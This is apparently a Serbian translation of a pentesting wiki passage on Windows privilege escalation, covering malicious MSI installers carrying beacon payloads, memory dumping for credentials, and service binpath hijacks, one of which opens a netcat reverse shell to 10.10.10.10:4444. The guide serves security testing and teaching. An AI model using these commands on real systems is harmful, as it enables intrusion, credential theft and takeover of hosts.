Ako imate meterpreter sesiju, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz power-up da biste u trenutnom direktorijumu kreirali Windows MSI binarnu datoteku za eskalaciju privilegija. Ova skripta ispisuje unapred kompajlirani MSI installer koji traži dodavanje korisnika/grupe (zato će vam biti potreban GIU pristup):

```
Write-UserAddMSI
```

Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj vodič da biste saznali kako da napravite MSI wrapper pomoću ovih alata. Imajte na umu da možete da umotate datoteku „**.bat**“ ako želite **samo** da **izvršavate** **komandne linije**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Kreiranje MSI-ja pomoću WIX-a


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Kreiranje MSI-ja pomoću Visual Studio-a

- Pomoću Cobalt Strike-a ili Metasploit-a **generišite** novi **Windows EXE TCP payload** u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i u polje za pretragu unesite „installer“. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Unesite naziv projekta, na primer **AlwaysPrivesc**, kao lokaciju izaberite **`C:\privesc`**, izaberite **place solution and project in the same directory** i kliknite na **Create**.
- Klikćite na **Next** dok ne stignete do 3. koraka od ukupno 4 (izbor datoteka koje treba uključiti). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer**-u i u odeljku **Properties** promenite **TargetPlatform** iz **x86** u **x64**.
  - Možete da promenite i druga svojstva, kao što su **Author** i **Manufacturer**, da bi instalirana aplikacija delovala legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite datoteku **beacon.exe** i kliknite na **OK**. Time ćete obezbediti da se Beacon payload izvrši čim se pokrene instalacioni program.
- U odeljku **Custom Action Properties** promenite **Run64Bit** u **True**.
- Na kraju, **izgradite projekat**.
  - Ako se pojavi upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste postavili platformu na x64.

### Instalacija MSI-ja

Da biste **u pozadini** izvršili **instalaciju** zlonamerne `.msi` datoteke:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirusni programi i detektori

### Podešavanja nadzora

Ova podešavanja određuju šta se **beleži**, zato obratite pažnju.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — zanimljivo je znati gde se šalju logovi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je osmišljen za **upravljanje lozinkama lokalnog Administratora**, čime se obezbeđuje da svaka lozinka bude **jedinstvena, nasumično generisana i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u Active Directory-ju i mogu im pristupiti samo korisnici kojima su dodeljene odgovarajuće dozvole putem ACL-ova, što im omogućava da vide lozinke lokalnog administratora ako su za to ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u čistom tekstu čuvaju se u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Počevši od **Windows 8.1**, Microsoft je uveo poboljšanu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubacuju kod, dodatno štiteći sistem.\
[**Više informacija o LSA Protection potražite ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti akreditive sačuvane na uređaju od pretnji kao što su pass-the-hash napadi. [**Više informacija o Credential Guard-u dostupno je ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširani akreditivi

**Akreditive domena** potvrđuje **Local Security Authority** (LSA), a koriste ih komponente operativnog sistema. Kada registrovani bezbednosni paket potvrdi podatke za prijavu korisnika, obično se uspostavljaju akreditivi domena za tog korisnika.\
[**Više informacija o keširanim akreditivima ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i grupe

### Nabrajanje korisnika i grupa

Trebalo bi da proverite da li neka od grupa kojima pripadate ima zanimljive dozvole.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda ćete moći da eskalirate privilegije**. Ovde saznajte više o privilegovanim grupama i kako da ih zloupotrebite za eskalaciju privilegija:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali više o zanimljivim tokenima** i kako da ih zloupotrebite:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / Sesije

```bash
qwinsta
klist sessions
```

### Korisničke fascikle

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinki

```bash
net accounts
```

### Preuzimanje sadržaja međuspremnika

```bash
powershell -command "Get-Clipboard"
```

## Pokrenuti procesi

### Dozvole za datoteke i fascikle

Pre svega, prilikom izlistavanja procesa **proverite da li se u komandnoj liniji procesa nalaze lozinke**.\
Proverite da li možete **da prepišete neku binarnu datoteku koja se izvršava** ili imate dozvole za pisanje u fasciklu sa binarnom datotekom, kako biste iskoristili moguće [**DLL Hijacking napade**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md); mogli biste da ih zloupotrebite za eskalaciju privilegija.

Debugger listener može kratko da bude aktivan, pa njegovo odsustvo iz jednog pasivnog snimka portova ne dokazuje da nikada nije bio izložen. Povežite svaki uočeni listener sa njegovim PID-om, vlasnikom procesa i mogućnošću korisnika sa nižim privilegijama da mu pristupi; samo ime aplikacije ili debug zastavica ne dokazuju mogućnost izvršavanja koda između korisnika. Rutinsko enumerisanje obavljajte pasivno, bez slanja debugger komandi.

**Provera dozvola binarnih datoteka procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Provera dozvola za fascikle binarnih datoteka procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort direktorijumi dinamičkih preprocessora

Snort 2 može da učitava deljene biblioteke iz direktorijuma `dynamicpreprocessor directory` navedenog u konfiguraciji izabranoj pomoću `snort.exe -c <config>`. Ako zakazani zadatak ili servis pokreće Snort pod drugim nalogom, proverite baš tu konfiguraciju i ACL deklarisanog direktorijuma modula. Ako vaš token može da kreira datoteke u tom direktorijumu, putanja je kandidat za proveru izvršavanja koda pri sledećem učitavanju modula koje obavi taj zadatak ili servis. Proverite efektivne privilegije naloga pod kojim se proces pokreće, aktivnu konfiguraciju, kompatibilnost modula i sva ograničenja zabrane pristupa ili deljenja; sama mogućnost upisivanja u direktorijum ne dokazuje eskalaciju. [Snortova dokumentacija za dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) opisuje učitavanje modula tokom izvršavanja.

### Privilegovani veb servis sa upisivim korenom dokumenata

Na Windows Apache instalaciji uporedite putanju izvršne datoteke servisa i nalog pod kojim se pokreće sa `DocumentRoot` vrednošću u aktivnom `httpd.conf`. Za uobičajeni raspored XAMPP-a proverite `C:\xampp\apache\conf\httpd.conf` i ACL konfigurisanog korena dokumenata, često `C:\xampp\htdocs`. Ako korisnik sa nižim privilegijama može da kreira datoteke u tom korenu dok Apache radi kao `LocalSystem`, izvršavanje server-side koda može da pređe granicu privilegija hosta. Potvrdite da servis radi, da se poslužuje tačna putanja i da server-side handler obrađuje tip datoteke; upisiv koren sam po sebi dokazuje samo mogućnost kreiranja datoteka. Proverite ACL-ove bez upisivanja probne datoteke:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Za uobičajenu WAMP instalaciju, servis može upućivati na verzionisani `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ili `C:\wamp\...` za 32-bitni raspored), sa konfiguracijom pored njega u `conf\httpd.conf` i podrazumevanim korenom `C:\wamp64\www` ili `C:\wamp\www`. Zajedno proverite tačnu putanju izvršne datoteke servisa, identitet pod kojim se pokreće, efektivni `DocumentRoot` (uključujući razrešavanje `${INSTALL_DIR}` i izmene u virtuelnim hostovima) i ACL korena. To što je WAMP direktorijum upisiv ne znači da se Apache pokreće kao `SYSTEM` niti da izvršava poslatu datoteku. [Apache dokumentuje kako Windows servis bira svoju konfiguraciju](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Upisiv IIS koren i mrežni identitet skupa aplikacija

Za IIS, povežite upisiv fizički direktorijum sa **aktivnim sajtom/aplikacijom** u `applicationHost.config`, pa utvrdite koji skup aplikacija je konfigurisan i koji obrađivač radi na serveru. Kod smešten u direktorijumu koji se poslužuje izvršava se kao skup aplikacija samo ako IIS obrađuje taj tip datoteke i ako je ruta dostupna. Pre nego što upisivi direktorijum smatrate mogućnošću za izvršavanje koda, proverite efektivna ovlašćenja trenutnog korisnika za kreiranje datoteka, stanje izvršavanja sajta, obrađivač i nadjačavanja za konkretnu putanju.

Dinamičko kompajliranje ASP.NET-a otvara zaseban put koji treba proveriti: generisane datoteke u direktorijumu za kompajliranje aplikacije. Podrazumevano se koristi direktorijum `Temporary ASP.NET Files` ispod odgovarajuće instalacije .NET Framework-a, ali `<compilation tempDirectory>` u aplikaciji može da promeni njegovu lokaciju. [Microsoft dokumentuje lokaciju i poddirektorijume za pojedinačne aplikacije](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) i [preporučuje izolovanje direktorijuma za kompajliranje kada skupovi aplikacija nemaju međusobno poverenje](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ako token korisnika sa nižim privilegijama može da izmeni generisani izvorni kod u kešu **konkretne** aplikacije, utvrdite da li ta aplikacija ponovo kompajlira taj kod pod privilegovanijim [identitetom procesa radnika](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL datoteke ili direktorijuma ne dokazuje mogućnost izvršavanja koda: povežite keš sa aktivnom aplikacijom, efektivnim tokenom i ACL-om, podešavanjima kompajliranja, identitetom procesa i trenutkom eventualnog ponovnog kompajliranja. Koristite pregled metapodataka samo za čitanje; nemojte pokretati kompajliranje niti menjati datoteke keša tokom enumeracije.

Skup IIS aplikacija konfigurisan kao `ApplicationPoolIdentity` ili `NetworkService` obično se autentifikuje ka resursima domena kao **računarski nalog hosta**, iako njegov lokalni token može imati niske privilegije. `LocalSystem` već ima visoke privilegije lokalno i takođe koristi računarski nalog na mreži; `LocalService` obično koristi anonimne mrežne akreditive. Skup `SpecificUser` koristi nalog koji je za njega konfigurisan. [Microsoft dokumentuje ove tipove identiteta](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) i [mrežni identitet skupa aplikacija](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Izostavljeno podešavanje identiteta može naslediti podrazumevane vrednosti skupa aplikacija, koje se razlikuju među generacijama IIS-a, zato utvrdite efektivnu konfiguraciju umesto da nagađate na osnovu naziva skupa. Ako se izvršavanje koda odvija u skupu čiji je mrežni identitet računarski nalog, procenite prava **tog konkretnog računara** u direktorijumu. [DCSync](../active-directory-methodology/dcsync.md) zahteva prava za replikaciju nad kontekstom imenovanja domena; tiket naloga računara ili uloga hosta sami po sebi ih ne dokazuju. Pasivna enumeracija treba da pregleda konfiguraciju i ACL-ove bez otpremanja datoteke, pokretanja mrežne autentifikacije ili zahtevanja tiketa.

Kod čitljivog ASP.NET obrađivača koji pokreće pomoćni proces, pratite svaku vrednost izvedenu iz zahteva kroz autentifikaciju, dešifrovanje, validaciju i sastavljanje komande. Obrađivač koji konkatenira dekodirani token u `ProcessStartInfo("cmd", "/c ...")` može omogućiti da metaznakovi komandne ljuske izmene komandu; [Microsoft dokumentuje specijalne znakove u `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Utvrdite da li nepouzdani pozivalac zaista može da utiče na dekodiranu vrednost i pristupi obrađivaču, a zatim utvrdite efektivni identitet skupa aplikacija ili identitet pri impersonaciji, kao i identitet podređenog procesa. Čitljiv red izvornog koda, listener na localhost-u ili slabost formata tokena sami po sebi ne dokazuju izvršavanje privilegovanih komandi. Pregledajte izvorni kod i konfiguraciju skupa aplikacija bez slanja falsifikovanih zahteva ili pokretanja pomoćnog programa tokom pasivne enumeracije.

Kod PHP servisa na Windows-u, putanja kontrolisana zahtevom prosleđena funkciji [`include` ili `require`](https://www.php.net/manual/en/function.include.php) može da izvrši PHP datoteku koju može da menja korisnik sa nižim privilegijama, pod identitetom procesa radnika. Potvrdite da zahtev može da dođe do te naredbe, da razrešena putanja pokazuje na datoteku koju korisnik sa nižim privilegijama može da menja, a proces radnika da čita, da važeća PHP ograničenja putanja dozvoljavaju uključivanje datoteke i da se proces radnika zaista izvršava sa višim privilegijama. Listener na loopback interfejsu ili upisiva datoteka sami po sebi ne uspostavljaju ovaj lanac; tokom pasivne enumeracije pregledajte izvorni kod, identitet servisa i ACL-ove datoteka bez pozivanja krajnje tačke.

### Pronalaženje lozinki u memoriji

Možete napraviti dump memorije pokrenutog procesa pomoću **procdump** iz sysinternals. Servisi poput FTP-a imaju **akreditive u čistom tekstu u memoriji**; pokušajte da napravite dump memorije i pročitate akreditive.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nesigurne GUI aplikacije

**Aplikacije koje se pokreću kao SYSTEM mogu omogućiti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: „Windows Help and Support“ (Windows + F1), potražite „command prompt“, kliknite na „Click to open Command Prompt“

### Uvoz projektnih datoteka s privilegijama

Aplikacija koja automatski otvara projekte iz direktorijuma za odlaganje u koji može da piše korisnik sa nižim privilegijama prelazi granicu poverenja ulaznih podataka pod nalogom aplikacije za uvoz. Proverite **tačnu putanju na koju može da se piše**, proces ili zadatak koji je otvara, njegov efektivni identitet i verziju parsera. [Istorijski problem s otvaranjem/obnavljanjem Ghidra projekta](https://github.com/NationalSecurityAgency/ghidra/issues/71) omogućavao je korišćenje XML spoljašnjih entiteta u metapodacima projekta; mrežni entitet u Windows-u mogao je da izazove autentifikaciju nalogom koji vrši uvoz, ako to dozvoljavaju [pravila za odlazni SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To ukazuje na moguće izlaganje akreditiva, a ne na neposredan pristup administratora: odgovor mora biti iskoristiv kroz zasebnu autorizovanu ili ranjivu putanju, a aktuelne verzije treba proceniti na osnovu stvarnog stanja zakrpa. Nemojte otvarati posebno izrađen projekat tokom pasivne enumeracije; pregledajte tok uvoza i ACL-ove.

## Servisi

Pravo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) na objektu Service Control Manager (SCM) odvojeno je od prava nad postojećim servisom. Uspešan, samo za čitanje, zahtev za pristup [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) za to pravo ukazuje na nešto što treba proveriti, ali nije dokaz da se novi servis može pokrenuti. [`CreateService` vraća handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) sa pristupom servisu zatraženim prilikom kreiranja; kasnije ponovno otvaranje servisa pokreće zasebnu proveru pristupa i može da ne uspe čak i kada bi mogao da se iskoristi prvobitni handle. Zasebno proverite efektivni lokalni ili udaljeni token, dodeljena prava handle-a, nalog servisa, pravila pokretanja i putanju do izvršne datoteke. Nemojte kreirati ni pokretati servis tokom pasivne enumeracije.

Kod udaljenog puta instalacije servisa, povežite ta SCM prava sa deljenim resursom na ciljnom sistemu u koji može da piše **isti mrežni nalog**, njegovim osnovnim NTFS ACL-om i lokalnom putanjom do izvršne datoteke koju nalog servisa može da pokrene. Nalog koji nije administratorski može preći ovu granicu ako postoje neuobičajeno široka SCM prava i putanja za postavljanje datoteke; administrativni deljeni resurs nije neophodan uslov. Samo pristup za pisanje u deljeni resurs ili samo mogućnost kreiranja servisa u SCM-u ne dokazuju da novi servis može da se pokrene pod identitetom viših privilegija.

Postojeći servis može da pozove pomoćnu izvršnu datoteku pri pokretanju, gašenju ili drugom događaju u životnom ciklusu, čak i kada te datoteke nema u njegovom `ImagePath`-u. Ako se ime pomoćne datoteke razrešava u direktorijum u koji može da piše korisnik sa nižim privilegijama, a servis radi pod identitetom viših privilegija, nedostajuća pomoćna datoteka može biti kandidat za uslovnu zamenu. Potvrdite **stvarni kod servisa ili dokumentovano pozivanje pomoćne datoteke**, razrešenu putanju do izvršne datoteke i redosled pretrage, prava za kreiranje direktorijuma, identitet servisa i postojanje dostupnog okidača životnog ciklusa. Direktorijum servisa u koji može da se piše ili sama nedostajuća datoteka ne dokazuju da servis učitava tu datoteku; pasivnim pregledom ne treba pokretati ni zaustavljati servis.

Za postojeći servis, [`SERVICE_START` omogućava prosleđivanje argumenata funkciji `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); to se razlikuje od prava [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Pregledajte kod servisa ili dokumentovani interfejs pre nego što pristup pokretanju smatrate nečim više od prava za upravljanje. Ako koristi argument koji bira pozivalac kao putanju do datoteke evidencije ili izvoza, proverite identitet servisa, tačan tok od argumenta do upisa, ograničenja putanje i dozvole nad **kreiranom datotekom**. Upis u zaštićeni direktorijum može dovesti do eskalacije samo ako postoji zaseban privilegovani potrošač ili učitavač koji prihvata tu datoteku; sama mogućnost pisanja u datoteku evidencije ili pravo pokretanja nisu dovoljni. Pasivni inventar ne treba da pokreće servis niti da kreira probnu datoteku.

Kod nadzornog agenta NSClient++, čitljiva datoteka `nsclient.ini` ukazuje na nešto što treba proveriti u konfiguraciji: u njoj mogu biti веб-акредитиви, док `boot.ini` може да преусмери конфигурацију на другу локацију. Proverite stvarni nalog servisa, WEB listener i pravila pristupa, kao i to da li autentifikovana uloga može da menja podešavanja ili skripte. Privilegovano izvršavanje dodatno zahteva `CheckExternalScripts` (ili drugi omogućen put izvršavanja), efektivno pravo za registrovanje ili izmenu komande i okidač koji je pokreće pod identitetom servisa. Listener ograničen samo na loopback i dalje može biti dostupan lokalnom korisniku, ali sama putanja do datoteke, lozinka ili listener ne dokazuju postojanje tih prava. Pregledajte metapodatke i dozvole bez prikazivanja tajni ili pozivanja web API-ja tokom pasivne enumeracije. Pogledajte [raspored datoteka NSClient++](https://nsclient.org/docs/concepts/file-layout/), [bezbednosne smernice za web i skripte](https://nsclient.org/docs/setup/securing/) i [konfiguraciju eksternih skripti](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Za servis čiji je `ImagePath` `nssm.exe`, pregledajte stvarni nalog pod kojim se servis pokreće i njegovu vrednost `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM tamo čuva podređenu aplikaciju](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), dok je `AppDirectory` njegov konfigurisani radni direktorijum. Proverite podređenu izvršnu datoteku i ACL-ove nad njenim nadređenim direktorijumima pre nego što dozvole omotača smatrate celom granicom servisa. Lokalna WCF ili SOAP krajnja tačka koju izlaže ta podređena aplikacija zaseban je pokazatelj za proveru: potvrdite da joj korisnik sa nižim privilegijama može pristupiti, da tačna operacija prihvata njegov ulaz i da podređena aplikacija servisa izvršava nesigurnu operaciju pod identitetom viših privilegija. Nalog servisa, URL krajnje tačke ili putanja u koju može da se piše sami po sebi ne dokazuju eskalaciju; nemojte pozivati operacije servisa tokom pasivne enumeracije.

Kod prilagođene WCF operacije, pratite string koji kontroliše pozivalac do bilo kog PowerShell runspace-a. [`Pipeline.Commands.AddScript` dodaje tekst skripte](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` pokreće pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` sa akreditivima Windows transporta](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) autentifikuje klijenta, ali se zasebno moraju proveriti ovlašćenja za pozivanje **konkretne** operacije i efektivni identitet runspace-a. Putanja od ulaza koji obezbeđuje pozivalac sa nižim privilegijama do `AddScript`-a pod identitetom servisa sa višim privilegijama predstavlja granicu izvršavanja koda; port koji sluša, autentifikovani klijent ili neiskorišćena metoda u nepovezanom assembly-ju sami po sebi nisu dokaz. Statički pregledajte instalirani servis, ugovor, ovlašćenja i podešavanja impersonacije, bez pozivanja krajnje tačke tokom enumeracije.

Service Triggers omogućavaju Windows-u da pokrene servis kada se ispune određeni uslovi (aktivnost imenovane cevi/RPC krajnje tačke, ETW događaji, dostupnost IP-a, priključenje uređaja, osvežavanje GPO-a itd.). Često možete pokrenuti privilegovane servise aktiviranjem njihovih okidača čak i bez prava SERVICE_START. Tehnike enumeracije i aktivacije nalaze se ovde:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio dijagnostički servis za prikupljanje podataka

Visual Studio instalacije sa C/C++ alatima mogu da sadrže `VSStandardCollectorService150`, dijagnostički servis podešen da se pokreće kao `LocalSystem`. U napadu [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) korišćeni su junction i race uslov sa object-manager link-om radi preusmeravanja resetovanja DACL-a servisa. Demonstrirana eskalacija zahtevala je i upotrebljivu putanju za popravku MSI-ja preko Visual Studio Setup WMI Provider-a, kao i cilj `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Komponenta je ispravljena u januaru 2024.

Za pasivnu trijažu pregledajte nalog i putanju binarne datoteke tog servisa, proverite da li postoji putanja do Setup WMI kompajlera i utvrdite da li je instalirana komponenta zakrpljena. Unos servisa, verzija Visual Studio proizvoda ili kompajlerska datoteka sami po sebi ne dokazuju da je sistem ranjiv. Pregled ne zahteva pokretanje servisa niti izvršavanje popravke.

Nabavite listu servisa:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu.

```bash
sc qc <service_name>
```

Preporučuje se da imate binarni fajl **accesschk** iz paketa _Sysinternals_ kako biste proverili potreban nivo privilegija za svaku uslugu.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se da proverite da li grupa „Authenticated Users“ može da menja neki servis:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Ovde možete da preuzmete accesschk.exe za XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućite servis

Ako dobijate ovu grešku (na primer, sa SSDPSRV):

_Došlo je do sistemske greške 1058._\
_Usluga se ne može pokrenuti jer je onemogućena ili zato što uz nju nije povezan nijedan omogućen uređaj._

Možete je omogućiti pomoću

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Imajte na umu da servis upnphost zavisi od SSDPSRV-a da bi radio (za XP SP1)**

**Još jedno zaobilazno rešenje** ovog problema je pokretanje:

```
sc.exe config usosvc start= auto
```

### **Izmena putanje binarne datoteke servisa**

U scenariju u kojem grupa „Authenticated users“ ima dozvolu **SERVICE_ALL_ACCESS** nad servisom, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili i izvršili **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovno pokretanje servisa

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije se mogu eskalirati putem različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava ponovnu konfiguraciju binarne datoteke servisa.
- **WRITE_DAC**: Omogućava ponovnu konfiguraciju dozvola, što omogućava promenu konfiguracija servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i ponovnu konfiguraciju dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost promene konfiguracija servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost promene konfiguracija servisa.

Za otkrivanje i iskorišćavanje ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole nad binarnim datotekama servisa

Ako se servis izvršava kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili privilegovani domenski nalog, ali **korisnici s niskim privilegijama mogu da menjaju EXE servisa ili njegovu nadređenu fasciklu**, servis se često može preuzeti **zamenom binarne datoteke i ponovnim pokretanjem servisa**.

**Proverite da li možete da menjate binarnu datoteku koju servis izvršava** ili da li imate **dozvole za pisanje u fasciklu** u kojoj se binarna datoteka nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Sve binarne datoteke koje servis izvršava možete da dobijete pomoću **wmic** (ne u system32), a svoje dozvole možete da proverite pomoću **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Možete koristiti i **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Potražite opasne ACL-ove dodeljene grupama **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, naročito dozvole **`(F)`**, **`(M)`** ili **`(W)`** nad izvršnom datotekom servisa ili direktorijumom u kom se ona nalazi. Praktičan postupak zloupotrebe:<sup>[[27]](#references)</sup>

1. Potvrdite nalog servisa i putanju do izvršne datoteke pomoću `sc qc <service_name>`.
2. Potvrdite da li u izvršnu datoteku može da se upisuje pomoću `icacls <path>`.
3. Zamenite binarnu datoteku servisa payload-om ili važećom zlonamernom binarnom datotekom servisa.
4. Ponovo pokrenite servis pomoću `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / okidač servisa).

Korisne automatizovane provere:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

